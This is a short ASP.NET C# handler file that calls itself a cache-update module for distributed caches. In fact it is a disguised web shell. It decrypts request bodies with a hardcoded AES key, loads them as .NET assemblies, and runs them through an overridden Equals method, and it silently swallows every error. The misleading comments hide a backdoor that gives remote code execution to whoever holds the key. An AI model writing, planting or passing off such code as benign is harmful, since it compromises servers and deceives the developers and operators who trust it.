<%@ WebHandler Language="C#" Class="DynamicCacheModuleHandler" %>
using System;
using System.Web;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Reflection;
using System.Text;

/// <summary>
/// Handles real-time updates for distributed cache modules.
/// The handler receives an encrypted payload which contains a serialized data processor.
/// </summary>
public class DynamicCacheModuleHandler : IHttpHandler
{
    private static readonly Dictionary<string, string> Config = new Dictionary<string, string> {
        { "EncryptionKey", "ca63457538b9b1e0" },
        { "ProcessorInterface", "K" }
    };

    /// <summary>
    /// Main entry point for processing cache update requests.
    /// </summary>
    public void ProcessRequest(HttpContext context)
    {
        // A valid request must contain cookies for authentication context.
        if (context.Request.Cookies.Count > 0)
        {
            var requestPayload = context.Request.BinaryRead(context.Request.ContentLength);
            if (requestPayload.Length > 0)
            {
                ExecutePayload(context, requestPayload);
            }
        }
    }

    /// <summary>
    /// Decrypts and executes the data processing module from the payload.
    /// </summary>
    /// <param name="context">The current HTTP context for the processor to use.</param>
    /// <param name="encryptedPayload">The binary payload containing the module.</param>
    private void ExecutePayload(HttpContext context, byte[] encryptedPayload)
    {
        try
        {
            // Decrypt the payload to get the raw assembly bytes.
            byte[] assemblyBytes = DecryptPayload(encryptedPayload);

            // Load the assembly containing the data processor.
            Assembly processorAssembly = Assembly.Load(assemblyBytes);
            
            // Instantiate the processor. The class name is defined in config.
            object processorInstance = processorAssembly.CreateInstance(Config["ProcessorInterface"]);

            // The 'Equals' method is overridden in the processor to serve as an entry point,
            // passing the context for it to operate on.
            processorInstance.Equals(context);
        }
        catch (Exception ex)
        {
            // In case of a failure, log the exception (logging is omitted for brevity).
            // A production system would have robust error handling here.
        }
    }

    /// <summary>
    /// Decrypts the provided byte array using AES (Rijndael).
    /// </summary>
    /// <param name="data">The encrypted data.</param>
    /// <returns>The decrypted data.</returns>
    private byte[] DecryptPayload(byte[] data)
    {
        byte[] key = Encoding.Default.GetBytes(Config["EncryptionKey"]);
        using (var aes = new RijndaelManaged())
        {
            // The key and IV are derived from the same configuration for this implementation.
            ICryptoTransform decryptor = aes.CreateDecryptor(key, key);
            return decryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }

    /// <summary>
    /// Handlers are not reusable to ensure thread safety and state isolation.
    /// </summary>
    public bool IsReusable { get { return false; } }
}